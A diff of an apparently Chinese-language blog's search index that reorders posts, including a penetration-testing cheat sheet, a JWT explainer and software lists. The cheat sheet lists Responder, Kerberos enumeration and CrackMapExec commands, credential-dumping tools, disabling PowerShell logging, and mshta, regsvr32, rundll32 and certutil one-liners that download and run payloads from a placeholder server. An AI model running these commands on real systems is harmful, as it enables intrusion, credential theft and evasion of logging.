@@ -86,147 +86,6 @@
       </tags>
   </entry>
   <entry>
-    <title>HACKER-USEFUL-GUIDE</title>
-    <url>/2021/12/25/HACKER-USEFUL-GUIDE/</url>
-    <content><![CDATA[<ul>
-<li><a href="#%E7%BD%91%E7%BB%9C%E5%8F%91%E7%8E%B0">网络发现</a></li>
-<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss">跨站脚本（XSS）</a></li>
-<li><a href="#%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%BD%91%E7%BB%9C%E4%B8%8A">在没有凭证的网络上</a></li>
-<li><a href="#%E6%9E%9A%E4%B8%BE%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7">枚举没有凭证的用户</a></li>
-<li><a href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E6%96%87%E6%9C%AC%E5%87%AD%E8%AF%81">从内存中提取明文文本凭证</a></li>
-<li><a href="#%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E9%85%8D%E7%BD%AE">脚本自动化配置</a></li>
-<li><a href="#%E7%A6%81%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">禁用日志记录</a></li>
-<li><a href="#windows%E4%B8%8Bcmd%E4%BB%8Einternet%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B">windows下cmd从internet下载文件实例</a></li>
-<li><a href="#win%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90">win从本地管理员获取系统权限</a></li>
-</ul>
-<h3 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h3><ol>
-<li>Burp Suite</li>
-<li>OWASP ZAP（开源）</li>
-<li>Dirbuster</li>
-<li>GoBuster：轻量级、快速的目录和子域名爆破工具</li>
-</ol>
-<h3 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h3><ol>
-<li>BeFF（浏览器漏洞利用框架）：将JavaScript静荷注入到浏览器中，创建一个命令和控制通道，以便javascript后期利用</li>
-<li>分两部分：服务器，攻击静荷</li>
-<li>盲XSS：执行存储的XSS静荷时看不到回显效果（例如：<a href="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22" title="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22">“联系我们”</a>）<ol>
-<li>XSS Hunter工具验证盲XSS</li>
-</ol>
-</li>
-</ol>
-<h3 id="在没有凭证的网络上"><a href="#在没有凭证的网络上" class="headerlink" title="在没有凭证的网络上"></a>在没有凭证的网络上</h3><ol>
-<li>Responder工具<ol>
-<li>http伪装windows验证：<code>sudo responder -I eth0 -wfFbw</code></li>
-</ol>
-</li>
-<li>MultiRelay.py</li>
-</ol>
-<h3 id="枚举没有凭证的用户"><a href="#枚举没有凭证的用户" class="headerlink" title="枚举没有凭证的用户"></a>枚举没有凭证的用户</h3><ol>
-<li>nmap：<code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=&quot;cyberspacekittens.local&quot;,userdb=/opt/userlist.txt 10.100.100.200</code></li>
-<li>CrackMapExec（CME）扫描：<code>cme smb 10.100.100.0/24 -d &#39;cyberspacekittens.local&#39; -u &#39;neil.pawstrong&#39; -p &#39;.wertSDFG&#39; -M empire_exec -o LISTENER=http</code></li>
-</ol>
-<h3 id="从内存中提取明文文本凭证"><a href="#从内存中提取明文文本凭证" class="headerlink" title="从内存中提取明文文本凭证"></a>从内存中提取明文文本凭证</h3><ol>
-<li>（针对win10）Mimikatz</li>
-<li>（针对浏览器）Mimikittenz</li>
-</ol>
-<h3 id="脚本自动化配置"><a href="#脚本自动化配置" class="headerlink" title="脚本自动化配置"></a>脚本自动化配置</h3><ol>
-<li>RC脚本自动化Metasploit</li>
-<li>Empire自动化</li>
-<li>Conbalt Strike自动化</li>
-</ol>
-<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><ol>
-<li>禁用powershell日志记录</li>
-</ol>
-<h3 id="windows下cmd从internet下载文件实例"><a href="#windows下cmd从internet下载文件实例" class="headerlink" title="windows下cmd从internet下载文件实例"></a>windows下cmd从internet下载文件实例</h3><ol>
-<li>利用windows“功能”：<ul>
-<li><code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></li>
-<li><code>mshta http://webserver/payload.hta</code></li>
-<li><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);windows.close();</code></li>
-<li><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</code></li>
-<li><code>certutil -urlcache -split -f http://server/payload payload</code></li>
-<li><code>certutil -urlcache -split -f http://server/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.dll &amp; C:\\Windows\Microsoft.NET\Framework64\ v4.0.30319\InstallUtil/logfile=/LogToConsole=false /u payload.dll</code></li>
-<li><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.exe &amp; payload.exe</code></li>
-</ul>
-</li>
-</ol>
-<h3 id="win从本地管理员获取系统权限"><a href="#win从本地管理员获取系统权限" class="headerlink" title="win从本地管理员获取系统权限"></a>win从本地管理员获取系统权限</h3><ol>
-<li>decoder-it创建一个PowerShell脚本，将本地管理Powershell提示符转换为System权限，通过创建一个新进程，设置新进程父类进程为系统进程。<ul>
-<li>C:&gt;<code>..\psgetsys.psl</code></li>
-<li>C:&gt;<code>[MyProcess]::CreateProcessFromParent(&lt;process_run_by_system&gt;,&lt;command_to_execute&gt;)</code></li>
-</ul>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>渗透</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JAVA学习路线图</title>
-    <url>/2022/03/23/JAVA-STUDY/</url>
-    <content><![CDATA[<p><img src="/img/java_study/Java%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF%E5%9B%BE.png"></p>
-<blockquote>
-<p>FROM：(B站UP主) 不高兴就喝水</p>
-</blockquote>
-]]></content>
-      <categories>
-        <category>JAVA</category>
-      </categories>
-      <tags>
-        <tag>编程语言</tag>
-        <tag>java</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>JWT - Json Web Token</title>
-    <url>/2023/06/04/JsonWebToken/</url>
-    <content><![CDATA[<h1 id="JWT简介"><a href="#JWT简介" class="headerlink" title="JWT简介"></a>JWT简介</h1><p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC7519)。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
-<h1 id="JWT结构"><a href="#JWT结构" class="headerlink" title="JWT结构"></a>JWT结构</h1><p>JWT由三部分组成，它们之间用圆点.连接<br><img src="/img/JsonWebToken/79625522ba6b45c0a1bfbdecfbd9c4f2.png" alt="e4618556f211ee5fc2842dcde0e99b12.png"></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、Header	--&gt;头部</span><br><span class="line">2、Payload	--&gt;负载</span><br><span class="line">3、Signature  --&gt;签名</span><br></pre></td></tr></table></figure>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拼接组成JWT：Header.Payload.Signature</span><br></pre></td></tr></table></figure>
-<ul>
-<li><a href="https://jwt.io/#encoded-jwt">在线解密工具1</a></li>
-<li><a href="https://tooltt.com/jwt-decode/">在线解密工具2</a></li>
-</ul>
-<ol>
-<li><p>Header：alg和typ</p>
- <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">alg<span class="punctuation">:</span> ALGORITHM	<span class="comment">//算法名称</span></span><br><span class="line">typ：TOKEN TYPE	<span class="comment">//token类型</span></span><br></pre></td></tr></table></figure>
- <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//例：</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
-<li><p>Payload（有效载荷）：用来存放实际需要传递的数据</p>
- <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Registered claims （标准中注册的声明） </span><br><span class="line">JWT 规定了7个官方字段，这些是一组预定义的claims，非强制性的，供选用。</span><br><span class="line">	iss (issuer)：签发人</span><br><span class="line">	exp (expiration time)：过期时间</span><br><span class="line">	sub (subject)：主题</span><br><span class="line">	aud (audience)：受众</span><br><span class="line">	nbf (Not Before)：生效时间</span><br><span class="line">	iat (Issued At)：签发时间</span><br><span class="line">	jti (JWT ID)：编号</span><br><span class="line">2. Public claims （公共的声明）</span><br><span class="line">可以随意定义。自定义claims，注意不要和JWT注册表中属性冲突，这里可以查看JWT注册表。</span><br><span class="line">3.Private claims （私有的声明）</span><br><span class="line">这些是自定义的claims，用于在同意使用这些claims的各方之间共享信息，它们既不是Registered claims，也不是Public claims。</span><br></pre></td></tr></table></figure>
- <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//例：</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span><span class="number">12356</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span>	<span class="comment">//主题</span></span><br><span class="line">	<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span>	<span class="comment">//自定义私有字段名字</span></span><br><span class="line">	<span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span><span class="number">12312312</span>	<span class="comment">//签发时间</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
-<li><p>Signature（签名）：对前两部分的签名，防止数据篡改</p>
-<ul>
-<li>三部分base64编码后用<code>.</code>拼接</li>
-<li>提供一个密钥（secret）用Header所规定的算法加密，形成新的字符串 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">	base64UrlEncode(header)+<span class="string">&quot;.&quot;</span>+</span><br><span class="line">	base65UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">	your<span class="number">-256</span>-bit-secret</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
-<h1 id="JWT特点"><a href="#JWT特点" class="headerlink" title="JWT特点"></a>JWT特点</h1></li>
-</ul>
-<ol>
-<li>JWT 默认是不加密，但也是可以加密的。</li>
-<li>JWT 不加密的情况下，不能将秘密数据写入 JWT。</li>
-<li>JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。</li>
-<li>JWT 签发了，在到期之前就会始终有效，因为服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或更改 token 的权限。</li>
-<li>JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。</li>
-<li>JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</li>
-</ol>
-</li>
-</ol>
-<h1 id="弱密钥爆破payload"><a href="#弱密钥爆破payload" class="headerlink" title="弱密钥爆破payload"></a>弱密钥爆破payload</h1><ul>
-<li>工具：<a href="https://github.com/brendan-rius/c-jwt-cracker">JWT cracker</a><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#usage</span><br><span class="line">docker build . -t jwtcrack xxxxxxxxxxxxxx.xxxxxxxx.xxxxx</span><br></pre></td></tr></table></figure></li>
-</ul>
-]]></content>
-      <categories>
-        <category>网络安全</category>
-      </categories>
-      <tags>
-        <tag>网络空间安全</tag>
-        <tag>json</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>C/C++ PROGRAM-GUIDE</title>
     <url>/2022/03/17/C-PROGRAM-GUIDE/</url>
     <content><![CDATA[<!-- markdown="1" is required for GitHub Pages to render the TOC properly. -->
@@ -875,8 +734,103 @@
         <category>网络安全</category>
       </categories>
       <tags>
-        <tag>编程语言</tag>
         <tag>程序开发安全</tag>
+        <tag>编程语言</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>HACKER-USEFUL-GUIDE</title>
+    <url>/2021/12/25/HACKER-USEFUL-GUIDE/</url>
+    <content><![CDATA[<ul>
+<li><a href="#%E7%BD%91%E7%BB%9C%E5%8F%91%E7%8E%B0">网络发现</a></li>
+<li><a href="#%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%ACxss">跨站脚本（XSS）</a></li>
+<li><a href="#%E5%9C%A8%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%BD%91%E7%BB%9C%E4%B8%8A">在没有凭证的网络上</a></li>
+<li><a href="#%E6%9E%9A%E4%B8%BE%E6%B2%A1%E6%9C%89%E5%87%AD%E8%AF%81%E7%9A%84%E7%94%A8%E6%88%B7">枚举没有凭证的用户</a></li>
+<li><a href="#%E4%BB%8E%E5%86%85%E5%AD%98%E4%B8%AD%E6%8F%90%E5%8F%96%E6%98%8E%E6%96%87%E6%96%87%E6%9C%AC%E5%87%AD%E8%AF%81">从内存中提取明文文本凭证</a></li>
+<li><a href="#%E8%84%9A%E6%9C%AC%E8%87%AA%E5%8A%A8%E5%8C%96%E9%85%8D%E7%BD%AE">脚本自动化配置</a></li>
+<li><a href="#%E7%A6%81%E7%94%A8%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95">禁用日志记录</a></li>
+<li><a href="#windows%E4%B8%8Bcmd%E4%BB%8Einternet%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%E5%AE%9E%E4%BE%8B">windows下cmd从internet下载文件实例</a></li>
+<li><a href="#win%E4%BB%8E%E6%9C%AC%E5%9C%B0%E7%AE%A1%E7%90%86%E5%91%98%E8%8E%B7%E5%8F%96%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90">win从本地管理员获取系统权限</a></li>
+</ul>
+<h3 id="网络发现"><a href="#网络发现" class="headerlink" title="网络发现"></a>网络发现</h3><ol>
+<li>Burp Suite</li>
+<li>OWASP ZAP（开源）</li>
+<li>Dirbuster</li>
+<li>GoBuster：轻量级、快速的目录和子域名爆破工具</li>
+</ol>
+<h3 id="跨站脚本（XSS）"><a href="#跨站脚本（XSS）" class="headerlink" title="跨站脚本（XSS）"></a>跨站脚本（XSS）</h3><ol>
+<li>BeFF（浏览器漏洞利用框架）：将JavaScript静荷注入到浏览器中，创建一个命令和控制通道，以便javascript后期利用</li>
+<li>分两部分：服务器，攻击静荷</li>
+<li>盲XSS：执行存储的XSS静荷时看不到回显效果（例如：<a href="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22" title="%22%E8%81%94%E7%B3%BB%E6%88%91%E4%BB%AC%22">“联系我们”</a>）<ol>
+<li>XSS Hunter工具验证盲XSS</li>
+</ol>
+</li>
+</ol>
+<h3 id="在没有凭证的网络上"><a href="#在没有凭证的网络上" class="headerlink" title="在没有凭证的网络上"></a>在没有凭证的网络上</h3><ol>
+<li>Responder工具<ol>
+<li>http伪装windows验证：<code>sudo responder -I eth0 -wfFbw</code></li>
+</ol>
+</li>
+<li>MultiRelay.py</li>
+</ol>
+<h3 id="枚举没有凭证的用户"><a href="#枚举没有凭证的用户" class="headerlink" title="枚举没有凭证的用户"></a>枚举没有凭证的用户</h3><ol>
+<li>nmap：<code>nmap -p88 --script krb5-enum-users --script-args krb5-enum-users.realm=&quot;cyberspacekittens.local&quot;,userdb=/opt/userlist.txt 10.100.100.200</code></li>
+<li>CrackMapExec（CME）扫描：<code>cme smb 10.100.100.0/24 -d &#39;cyberspacekittens.local&#39; -u &#39;neil.pawstrong&#39; -p &#39;.wertSDFG&#39; -M empire_exec -o LISTENER=http</code></li>
+</ol>
+<h3 id="从内存中提取明文文本凭证"><a href="#从内存中提取明文文本凭证" class="headerlink" title="从内存中提取明文文本凭证"></a>从内存中提取明文文本凭证</h3><ol>
+<li>（针对win10）Mimikatz</li>
+<li>（针对浏览器）Mimikittenz</li>
+</ol>
+<h3 id="脚本自动化配置"><a href="#脚本自动化配置" class="headerlink" title="脚本自动化配置"></a>脚本自动化配置</h3><ol>
+<li>RC脚本自动化Metasploit</li>
+<li>Empire自动化</li>
+<li>Conbalt Strike自动化</li>
+</ol>
+<h3 id="禁用日志记录"><a href="#禁用日志记录" class="headerlink" title="禁用日志记录"></a>禁用日志记录</h3><ol>
+<li>禁用powershell日志记录</li>
+</ol>
+<h3 id="windows下cmd从internet下载文件实例"><a href="#windows下cmd从internet下载文件实例" class="headerlink" title="windows下cmd从internet下载文件实例"></a>windows下cmd从internet下载文件实例</h3><ol>
+<li>利用windows“功能”：<ul>
+<li><code>mshta vbscript:Close(Execute(&quot;GetObject(&quot;&quot;script:http://webserver/payload.sct&quot;&quot;)&quot;))</code></li>
+<li><code>mshta http://webserver/payload.hta</code></li>
+<li><code>rundll32.exe javascript:&quot;\..\mshtml,RunHTMLApplication&quot;;o=GetObject(&quot;script:http://webserver/payload.sct&quot;);windows.close();</code></li>
+<li><code>regsvr32 /u /n /s /i:http://webserver/payload.sct scrobj.dll</code></li>
+<li><code>certutil -urlcache -split -f http://server/payload payload</code></li>
+<li><code>certutil -urlcache -split -f http://server/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.dll &amp; C:\\Windows\Microsoft.NET\Framework64\ v4.0.30319\InstallUtil/logfile=/LogToConsole=false /u payload.dll</code></li>
+<li><code>certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 &amp;certutil -decode payload.b64 payload.exe &amp; payload.exe</code></li>
+</ul>
+</li>
+</ol>
+<h3 id="win从本地管理员获取系统权限"><a href="#win从本地管理员获取系统权限" class="headerlink" title="win从本地管理员获取系统权限"></a>win从本地管理员获取系统权限</h3><ol>
+<li>decoder-it创建一个PowerShell脚本，将本地管理Powershell提示符转换为System权限，通过创建一个新进程，设置新进程父类进程为系统进程。<ul>
+<li>C:&gt;<code>..\psgetsys.psl</code></li>
+<li>C:&gt;<code>[MyProcess]::CreateProcessFromParent(&lt;process_run_by_system&gt;,&lt;command_to_execute&gt;)</code></li>
+</ul>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>网络空间安全</tag>
+        <tag>渗透</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JAVA学习路线图</title>
+    <url>/2022/03/23/JAVA-STUDY/</url>
+    <content><![CDATA[<p><img src="/img/java_study/Java%E5%AD%A6%E4%B9%A0%E8%B7%AF%E7%BA%BF%E5%9B%BE.png"></p>
+<blockquote>
+<p>FROM：(B站UP主) 不高兴就喝水</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>JAVA</category>
+      </categories>
+      <tags>
+        <tag>编程语言</tag>
+        <tag>java</tag>
       </tags>
   </entry>
   <entry>
@@ -1161,6 +1115,64 @@
       <tags>
         <tag>操作系统</tag>
         <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>JWT - Json Web Token</title>
+    <url>/2023/06/04/JsonWebToken/</url>
+    <content><![CDATA[<h1 id="JWT简介"><a href="#JWT简介" class="headerlink" title="JWT简介"></a>JWT简介</h1><p>Json web token (JWT), 是为了在网络应用环境间传递声明而执行的一种基于JSON的开放标准（(RFC7519)。该token被设计为紧凑且安全的，特别适用于分布式站点的单点登录（SSO）场景。JWT的声明一般被用来在身份提供者和服务提供者间传递被认证的用户身份信息，以便于从资源服务器获取资源，也可以增加一些额外的其它业务逻辑所必须的声明信息，该token也可直接被用于认证，也可被加密。</p>
+<h1 id="JWT结构"><a href="#JWT结构" class="headerlink" title="JWT结构"></a>JWT结构</h1><p>JWT由三部分组成，它们之间用圆点.连接<br><img src="/img/JsonWebToken/79625522ba6b45c0a1bfbdecfbd9c4f2.png" alt="e4618556f211ee5fc2842dcde0e99b12.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1、Header	--&gt;头部</span><br><span class="line">2、Payload	--&gt;负载</span><br><span class="line">3、Signature  --&gt;签名</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">拼接组成JWT：Header.Payload.Signature</span><br></pre></td></tr></table></figure>
+<ul>
+<li><a href="https://jwt.io/#encoded-jwt">在线解密工具1</a></li>
+<li><a href="https://tooltt.com/jwt-decode/">在线解密工具2</a></li>
+</ul>
+<ol>
+<li><p>Header：alg和typ</p>
+ <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">alg<span class="punctuation">:</span> ALGORITHM	<span class="comment">//算法名称</span></span><br><span class="line">typ：TOKEN TYPE	<span class="comment">//token类型</span></span><br></pre></td></tr></table></figure>
+ <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//例：</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>Payload（有效载荷）：用来存放实际需要传递的数据</p>
+ <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. Registered claims （标准中注册的声明） </span><br><span class="line">JWT 规定了7个官方字段，这些是一组预定义的claims，非强制性的，供选用。</span><br><span class="line">	iss (issuer)：签发人</span><br><span class="line">	exp (expiration time)：过期时间</span><br><span class="line">	sub (subject)：主题</span><br><span class="line">	aud (audience)：受众</span><br><span class="line">	nbf (Not Before)：生效时间</span><br><span class="line">	iat (Issued At)：签发时间</span><br><span class="line">	jti (JWT ID)：编号</span><br><span class="line">2. Public claims （公共的声明）</span><br><span class="line">可以随意定义。自定义claims，注意不要和JWT注册表中属性冲突，这里可以查看JWT注册表。</span><br><span class="line">3.Private claims （私有的声明）</span><br><span class="line">这些是自定义的claims，用于在同意使用这些claims的各方之间共享信息，它们既不是Registered claims，也不是Public claims。</span><br></pre></td></tr></table></figure>
+ <figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="comment">//例：</span></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span><span class="number">12356</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span>	<span class="comment">//主题</span></span><br><span class="line">	<span class="attr">&quot;name&quot;</span><span class="punctuation">:</span><span class="string">&quot;John Doe&quot;</span><span class="punctuation">,</span>	<span class="comment">//自定义私有字段名字</span></span><br><span class="line">	<span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span><span class="number">12312312</span>	<span class="comment">//签发时间</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure></li>
+<li><p>Signature（签名）：对前两部分的签名，防止数据篡改</p>
+<ul>
+<li>三部分base64编码后用<code>.</code>拼接</li>
+<li>提供一个密钥（secret）用Header所规定的算法加密，形成新的字符串 <figure class="highlight json"><table><tr><td class="code"><pre><span class="line">HMACSHA256(</span><br><span class="line">	base64UrlEncode(header)+<span class="string">&quot;.&quot;</span>+</span><br><span class="line">	base65UrlEncode(payload)<span class="punctuation">,</span></span><br><span class="line">	your<span class="number">-256</span>-bit-secret</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+<h1 id="JWT特点"><a href="#JWT特点" class="headerlink" title="JWT特点"></a>JWT特点</h1></li>
+</ul>
+<ol>
+<li>JWT 默认是不加密，但也是可以加密的。</li>
+<li>JWT 不加密的情况下，不能将秘密数据写入 JWT。</li>
+<li>JWT 不仅可以用于认证，也可以用于交换信息。有效使用 JWT，可以降低服务器查询数据库的次数。</li>
+<li>JWT 签发了，在到期之前就会始终有效，因为服务器不保存 session 状态，因此无法在使用过程中废止某个 token，或更改 token 的权限。</li>
+<li>JWT 本身包含了认证信息，一旦泄露，任何人都可以获得该令牌的所有权限。</li>
+<li>JWT 不应该使用 HTTP 协议明码传输，要使用 HTTPS 协议传输。</li>
+</ol>
+</li>
+</ol>
+<h1 id="弱密钥爆破payload"><a href="#弱密钥爆破payload" class="headerlink" title="弱密钥爆破payload"></a>弱密钥爆破payload</h1><ul>
+<li>工具：<a href="https://github.com/brendan-rius/c-jwt-cracker">JWT cracker</a><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#usage</span><br><span class="line">docker build . -t jwtcrack xxxxxxxxxxxxxx.xxxxxxxx.xxxxx</span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+      <categories>
+        <category>网络安全</category>
+      </categories>
+      <tags>
+        <tag>网络空间安全</tag>
+        <tag>json</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>MY FAVOR TOOLS BANK</title>
+    <url>/2022/03/22/My-Attack-Tools/</url>
+    <content><![CDATA[<h1 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h1><h2 id="JOPLIN"><a href="#JOPLIN" class="headerlink" title="JOPLIN"></a>JOPLIN</h2><h2 id="ANKI"><a href="#ANKI" class="headerlink" title="ANKI"></a>ANKI</h2><h2 id="MARKTEST"><a href="#MARKTEST" class="headerlink" title="MARKTEST"></a>MARKTEST</h2><h2 id="RIME"><a href="#RIME" class="headerlink" title="RIME"></a>RIME</h2><h2 id="ASF"><a href="#ASF" class="headerlink" title="ASF"></a>ASF</h2><h2 id="Virtualbox"><a href="#Virtualbox" class="headerlink" title="Virtualbox"></a>Virtualbox</h2><h2 id="PotPlayer"><a href="#PotPlayer" class="headerlink" title="PotPlayer"></a>PotPlayer</h2><h2 id="Neat-Download-Manager"><a href="#Neat-Download-Manager" class="headerlink" title="Neat Download Manager"></a>Neat Download Manager</h2><h2 id="OllyDBG"><a href="#OllyDBG" class="headerlink" title="OllyDBG"></a>OllyDBG</h2><h1 id="商业软件（部分含community版）"><a href="#商业软件（部分含community版）" class="headerlink" title="商业软件（部分含community版）"></a>商业软件（部分含community版）</h1><h2 id="Vmware"><a href="#Vmware" class="headerlink" title="Vmware"></a>Vmware</h2><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><h2 id="Arduino"><a href="#Arduino" class="headerlink" title="Arduino"></a>Arduino</h2><h2 id="Pycharm"><a href="#Pycharm" class="headerlink" title="Pycharm"></a>Pycharm</h2><h2 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h2><h2 id="Visual-Studio-IDE"><a href="#Visual-Studio-IDE" class="headerlink" title="Visual Studio IDE"></a>Visual Studio IDE</h2>]]></content>
+      <categories>
+        <category>开源项目</category>
+      </categories>
+      <tags>
+        <tag>tools</tag>
+        <tag>software</tag>
       </tags>
   </entry>
   <entry>
@@ -1509,18 +1521,6 @@
       </tags>
   </entry>
   <entry>
-    <title>MY FAVOR TOOLS BANK</title>
-    <url>/2022/03/22/My-Attack-Tools/</url>
-    <content><![CDATA[<h1 id="开源项目"><a href="#开源项目" class="headerlink" title="开源项目"></a>开源项目</h1><h2 id="JOPLIN"><a href="#JOPLIN" class="headerlink" title="JOPLIN"></a>JOPLIN</h2><h2 id="ANKI"><a href="#ANKI" class="headerlink" title="ANKI"></a>ANKI</h2><h2 id="MARKTEST"><a href="#MARKTEST" class="headerlink" title="MARKTEST"></a>MARKTEST</h2><h2 id="RIME"><a href="#RIME" class="headerlink" title="RIME"></a>RIME</h2><h2 id="ASF"><a href="#ASF" class="headerlink" title="ASF"></a>ASF</h2><h2 id="Virtualbox"><a href="#Virtualbox" class="headerlink" title="Virtualbox"></a>Virtualbox</h2><h2 id="PotPlayer"><a href="#PotPlayer" class="headerlink" title="PotPlayer"></a>PotPlayer</h2><h2 id="Neat-Download-Manager"><a href="#Neat-Download-Manager" class="headerlink" title="Neat Download Manager"></a>Neat Download Manager</h2><h2 id="OllyDBG"><a href="#OllyDBG" class="headerlink" title="OllyDBG"></a>OllyDBG</h2><h1 id="商业软件（部分含community版）"><a href="#商业软件（部分含community版）" class="headerlink" title="商业软件（部分含community版）"></a>商业软件（部分含community版）</h1><h2 id="Vmware"><a href="#Vmware" class="headerlink" title="Vmware"></a>Vmware</h2><h2 id="Wireshark"><a href="#Wireshark" class="headerlink" title="Wireshark"></a>Wireshark</h2><h2 id="Arduino"><a href="#Arduino" class="headerlink" title="Arduino"></a>Arduino</h2><h2 id="Pycharm"><a href="#Pycharm" class="headerlink" title="Pycharm"></a>Pycharm</h2><h2 id="Visual-Studio"><a href="#Visual-Studio" class="headerlink" title="Visual Studio"></a>Visual Studio</h2><h2 id="Visual-Studio-IDE"><a href="#Visual-Studio-IDE" class="headerlink" title="Visual Studio IDE"></a>Visual Studio IDE</h2>]]></content>
-      <categories>
-        <category>开源项目</category>
-      </categories>
-      <tags>
-        <tag>tools</tag>
